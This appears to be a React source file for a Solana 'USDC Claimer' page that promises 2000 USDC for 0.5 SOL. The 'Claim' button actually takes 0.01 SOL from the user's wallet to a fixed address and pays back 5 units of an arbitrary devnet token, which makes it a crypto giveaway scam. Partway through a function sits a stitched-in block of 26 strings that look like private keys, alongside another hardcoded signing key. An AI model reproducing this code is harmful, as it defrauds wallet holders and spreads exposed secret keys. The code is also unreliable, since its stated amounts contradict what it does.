/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "23B4ApQxv79h19dzarhNaPQ7MXPtAfVVT6w636QVwDrj8fPJsWQ3zcmRVHW3avjhtkpcP3RS9XcmpT1vF5S5yMo2"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4VqgpivN7PkQELj47Yo1anTk2SEdnACLUM696qMZnUkQ7k1cq9E1wVatfVq7yPJxMQaayFecrkW6CFcHU2EXHjSR",
  "key1": "UqD3zAREeKsc6aoDoSEsTU4m6Dy4KLqVXEjRhz8bhqQ7j41KQxHFGK6nPHKLLnorsxfXvrshVwj6vf4djuLEBLb",
  "key2": "dW3QtxokqEYZX1ZTCkajVfex77bmszLGprZANPjTHeYXYfziq4AA7PgW5SEFfYZtfSAY7qYhYLCapWvMJtygdKC",
  "key3": "3n3RHMMJ1dhu4CK5H6niRA52UVrqoCjTegkCv4teboBV8rC1QSnf1dUQsXV5HegLTnvXSAtjFnTxGk8Z2uH2V3i",
  "key4": "58WbKywLDyfbViKyN4vjJmBJt8hCJissJzqifQGAxfU3S8o2Ao2de3VeafPo6G2gUAuvpEzMAmYEZmGiCtDSgMQ1",
  "key5": "3ywtxUXQKMqWrUXcHrnSPFnDGzvhBqqXwa4mJB9UdUSkXWqZxW9bb2naXCjyGNHesaehu26N6mHqMtyeuuj9bYNu",
  "key6": "njhkWViHNDZn6aTWyiVpUJuETaRpKZb1ZeQ8UPiBCS8P5vPuuuoM3iNfezMdhsQSE5APsFPYRKB2gruxfcDPJGp",
  "key7": "g8ZPybt3CntxMT3NDLEMERQ34SmH1Pc2Xh2cCcTkQzAxgwYT7prL2GX8oFGTwmPCXRongQaeQGbRviWTjQDuHEi",
  "key8": "3A2qJSnhDnpKqXn4tdntm7tod8gZybHVK7nAHb3W3qCAJSQYKdfPeDC56M7JbpoWLFz4orLgP5TniCKykvMM2aZD",
  "key9": "4iKBEivPirCCQF14uDtqGKX5fJyxBpQyKnXQDrbj14NUWuDEsx6ErmCJGaqxkf5ur6N2UQFgEcrmeVdW5AUVtwad",
  "key10": "2wF6Ztp83fLH32d5ZwuDydrnrsiGudr97SVyhxV6GuicUBCcJB5wMXg4rinLczkpytUQ4d126FT9GnJEoD9KtnR8",
  "key11": "3VeMA5eENGaom1FnWBGTvAqhxpq1Qd39bs5vQ2KHDXNWEH6YPC6emtJEmTvPtnAh2xqqpARnKuKPMkKSeVzb4KYL",
  "key12": "5iH8j19kvKpV5W1Q1mFM8Vjc6mhYgayodeVSjBQaVsR14GUq7Af4gzAVweDkiurkcWHQqCVdxgZKFwKndWaDwu1V",
  "key13": "4BQLavTiTB5oDKjA8MRFZMQ59w4Gq7riCEsTqS9kDNu4TsSFr7Fsbu5CLHjptLpZmt2SbxhbkMmanonoM8nZAiuc",
  "key14": "1GkcgEwjWDsj7GPyiqdK2Tp7u5uQ2zMyDYVhXDosuWCvZTrviLRGW6287nHcCexDE9tZrzkiUdGEerqLnzpGFum",
  "key15": "4Nw9gpXov77GW8Vb24yvVn93ZqGtuTVzWfgquFd8cLRy4r78eTJGoMNNvd8sDytvqm2TEgzgFMehg8hRkqGiX81W",
  "key16": "me7Dj446BD3aucKcM4W7C61zHAXPRgupUiGRua98dPRbx6N4Krev6gqDoUfJSweNK1RzCDkQaDwEbLYXpkAJWqG",
  "key17": "4cEuQALiUZCjXHPrKRLVxjLXschdTUSBAGmfsiLzsXZ1yxnhBsieb1Lri2UjP2TCkPB3FjTExXNgV9agJN6vCsAs",
  "key18": "27LYKkCSLb19v6SmGd8RLAJBmC2NsN7efLBXRcjMSyDvHNiVtZXhVAgy3k1fD7zNQ54UepYqFhXe1Che9gSfsZdB",
  "key19": "53tj3wSYToba19Bu12qVuxgtwber1UbHz78gHbQ4tTKUy18DysF8j294sjoo8JoCpo7YdAeh5y1mQKjLKbuGXTmG",
  "key20": "3hWe4YEdzqD8AiR4iXi78kNEUwWG3ZfG8quTvFDChqcgmxmH5YsJbZ9GaHinWe4DCZt28FjgwmCotrg8K5pFjLkH",
  "key21": "3L6Mpw8qL4YBizuUPsAZpSacMkuGANAEtNC26bbJFmAfgGVLPh7R6ZoVyFZM6af1s4EZiC4V2LBwVcF8uWTb9rsy",
  "key22": "5jvjWBZmAwfDaBZSWnBYeKVm5UsEzhKuXviTek5xvuBibuzbXcC8BAMTD7yiWnmsw6CeeGsdRiVRq2zzm3EmhSrr",
  "key23": "NYJm5WX7BkuR6jM2acXZf1KBeRTpDDLEqLREBi9Sd6ExTzsbXDpLcdiBnde6pV4Hoyf5Np6HmJ4t23BtQZiDs7F",
  "key24": "2pTtFiSfS5v19jHEbcvwSx4YvxmemWuVnqKxuRxXbwC5jMCEJyeaJaBE1pvAKarq4jQBxruqrgHrMRNhsFBssFTH",
  "key25": "3hkBWLgLnXFdH2t4HCtNd8Fb5mKzFYTwTdB39apZfsu13aqM8p2yvmUR5t9QQFihvNvfM4pWaUSfVy88meECjFHh"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
